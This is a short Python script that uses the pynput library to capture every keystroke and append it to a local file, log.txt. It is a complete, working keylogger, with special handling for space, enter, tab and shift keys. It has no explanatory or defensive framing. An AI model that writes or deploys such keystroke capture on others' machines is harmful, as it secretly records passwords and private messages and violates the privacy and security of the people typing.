from pynput.keyboard import Listener



def write_to_file(key):
    f = open("log.txt", 'a')
    letter = str(key).replace("'", "")
    # handle Keys
    if(letter == 'Key.space'):
        letter = ' '
    if(letter == 'Key.enter'):
        letter = '\n'
    if(letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == 'Key.shift'):
        letter = ''
    if(letter == 'Key.tab'):
        letter= '\t'     
    
    f.write(letter)
    f.close()


with Listener(on_press=write_to_file) as lis:
    lis.join()
    
 